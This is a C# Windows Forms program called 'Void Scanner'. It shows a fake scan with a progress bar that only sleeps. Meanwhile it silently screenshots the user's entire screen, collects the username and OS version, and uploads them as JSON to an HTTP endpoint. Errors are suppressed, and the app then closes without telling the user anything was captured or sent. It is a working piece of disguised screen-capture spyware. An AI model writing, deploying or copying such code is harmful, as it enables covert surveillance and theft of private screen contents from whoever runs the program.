using System;
using System.Windows.Forms;
using System.Drawing;
using System.Net;
using System.Text;
using System.IO;

namespace SimpleVoidScanner
{
    public partial class SimpleVoidScannerForm : Form
    {
        private Button scanButton;
        private Label statusLabel;
        private ProgressBar progressBar;
        private PictureBox animePictureBox;
        private Timer animationTimer;
        private string pinCode;
        private int animationFrame = 0;

        public SimpleVoidScannerForm()
        {
            InitializeComponent();
        }

        private void InitializeComponent()
        {
            this.Text = "Void Scanner";
            this.Size = new Size(700, 500);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = Color.Black;
            this.FormBorderStyle = FormBorderStyle.None;

            // Anime PictureBox
            animePictureBox = new PictureBox();
            animePictureBox.Size = new Size(700, 500);
            animePictureBox.Location = new Point(0, 0);
            animePictureBox.BackColor = Color.Black;
            animePictureBox.Paint += AnimePictureBox_Paint;
            this.Controls.Add(animePictureBox);

            // Start Button
            scanButton = new Button();
            scanButton.Text = "START";
            scanButton.Font = new Font("Arial", 24, FontStyle.Bold);
            scanButton.BackColor = Color.Red;
            scanButton.ForeColor = Color.White;
            scanButton.Size = new Size(200, 80);
            scanButton.Location = new Point(250, 200);
            scanButton.Click += ScanButton_Click;
            this.Controls.Add(scanButton);

            // Status Label
            statusLabel = new Label();
            statusLabel.Text = "Ready to scan...";
            statusLabel.Font = new Font("Arial", 12);
            statusLabel.ForeColor = Color.White;
            statusLabel.AutoSize = true;
            statusLabel.Location = new Point(300, 300);
            this.Controls.Add(statusLabel);

            // Progress Bar
            progressBar = new ProgressBar();
            progressBar.Size = new Size(400, 30);
            progressBar.Location = new Point(150, 350);
            progressBar.Visible = false;
            this.Controls.Add(progressBar);

            // Animation Timer
            animationTimer = new Timer();
            animationTimer.Interval = 50;
            animationTimer.Tick += AnimationTimer_Tick;
            animationTimer.Start();

            // Mouse Click Event
            this.MouseClick += SimpleVoidScannerForm_MouseClick;
        }

        private void AnimePictureBox_Paint(object sender, PaintEventArgs e)
        {
            // Draw anime character (simple version)
            using (SolidBrush blackBrush = new SolidBrush(Color.Black))
            {
                e.Graphics.FillRectangle(blackBrush, 0, 0, 700, 500);
            }

            // Draw simple anime character
            using (SolidBrush redBrush = new SolidBrush(Color.Red))
            {
                // Head
                e.Graphics.FillEllipse(redBrush, 300, 100, 100, 100);
                // Body
                e.Graphics.FillRectangle(redBrush, 320, 200, 60, 100);
                // Arms
                e.Graphics.FillRectangle(redBrush, 280, 220, 40, 20);
                e.Graphics.FillRectangle(redBrush, 380, 220, 40, 20);
                // Legs
                e.Graphics.FillRectangle(redBrush, 330, 300, 20, 80);
                e.Graphics.FillRectangle(redBrush, 350, 300, 20, 80);
            }

            // Draw rain effect
            DrawRain(e.Graphics);
        }

        private void DrawRain(Graphics g)
        {
            using (Pen rainPen = new Pen(Color.FromArgb(100, Color.Black), 1))
            {
                for (int i = 0; i < 50; i++)
                {
                    int x = (i * 14 + animationFrame) % 700;
                    int y = (animationFrame * 2 + i * 10) % 500;
                    g.DrawLine(rainPen, x, y, x, y + 20);
                }
            }
        }

        private void AnimationTimer_Tick(object sender, EventArgs e)
        {
            animationFrame++;
            animePictureBox.Invalidate();
        }

        private void SimpleVoidScannerForm_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.X >= 250 && e.X <= 450 && e.Y >= 200 && e.Y <= 280)
            {
                MessageBox.Show("Start butonu basıldı!", "Debug", MessageBoxButtons.OK, MessageBoxIcon.Information);
                ScanButton_Click(sender, e);
            }
        }

        private void ScanButton_Click(object sender, EventArgs e)
        {
            scanButton.Enabled = false;
            statusLabel.Text = "Scanning...";
            progressBar.Visible = true;
            progressBar.Value = 0;

            // Generate PIN
            pinCode = GenerateRandomPin();
            
            // Start scanning
            System.Threading.Thread scanThread = new System.Threading.Thread(PerformScan);
            scanThread.Start();
        }

        private string GenerateRandomPin()
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            Random random = new Random();
            StringBuilder pin = new StringBuilder();
            for (int i = 0; i < 8; i++)
            {
                pin.Append(chars[random.Next(chars.Length)]);
            }
            return pin.ToString();
        }

        private void PerformScan()
        {
            try
            {
                // Simulate scanning
                for (int i = 0; i <= 100; i += 10)
                {
                    this.Invoke(new MethodInvoker(delegate()
                    {
                        progressBar.Value = i;
                        statusLabel.Text = "Scanning... " + i + "%";
                    }));
                    System.Threading.Thread.Sleep(500);
                }

                // Take screenshot
                string screenshotPath = TakeScreenshot();
                
                // Send results
                SendResults(screenshotPath);

                this.Invoke(new MethodInvoker(delegate()
                {
                    statusLabel.Text = "Scan completed!";
                    progressBar.Value = 100;
                }));

                // Wait 3 seconds then close
                System.Threading.Thread.Sleep(3000);
                this.Invoke(new MethodInvoker(delegate()
                {
                    Application.Exit();
                }));
            }
            catch (Exception ex)
            {
                this.Invoke(new MethodInvoker(delegate()
                {
                    statusLabel.Text = "Error: " + ex.Message;
                }));
            }
        }

        private string TakeScreenshot()
        {
            try
            {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics graphics = Graphics.FromImage(bitmap))
                    {
                        graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
                    }
                    
                    string screenshotPath = Path.Combine(Path.GetTempPath(), "void_screenshot_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".png");
                    bitmap.Save(screenshotPath, System.Drawing.Imaging.ImageFormat.Png);
                    return screenshotPath;
                }
            }
            catch
            {
                return null;
            }
        }

        private void SendResults(string screenshotPath)
        {
            try
            {
                using (WebClient client = new WebClient())
                {
                    client.Headers.Add("X-API-Key", "VOID_SCANNER_API_KEY_2025");
                    client.Headers.Add("Content-Type", "application/json");
                    
                    string screenshotBase64 = null;
                    if (!string.IsNullOrEmpty(screenshotPath) && File.Exists(screenshotPath))
                    {
                        byte[] screenshotBytes = File.ReadAllBytes(screenshotPath);
                        screenshotBase64 = "data:image/png;base64," + Convert.ToBase64String(screenshotBytes);
                    }
                    
                    string results = "VOID SCANNER - SIMPLE SCAN COMPLETED\n" +
                                   "Scan Date: " + DateTime.Now.ToString("dd.MM.yyyy HH:mm:ss") + "\n" +
                                   "System: " + Environment.OSVersion.VersionString + "\n" +
                                   "User: " + Environment.UserName + "\n" +
                                   "Screenshot: " + (screenshotPath ?? "Not available");
                    
                    string json = "{\"pin\":\"" + pinCode + "\",\"results\":\"" + results.Replace("\"", "\\\"").Replace("\n", "\\n") + "\",\"screenshot\":\"" + screenshotBase64 + "\"}";
                    
                    client.UploadString("http://localhost:5005/api/scan-results", "POST", json);
                }
            }
            catch
            {
                // Silent fail
            }
        }
    }

    public class Program
    {
        [STAThread]
        public static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new SimpleVoidScannerForm());
        }
    }
}
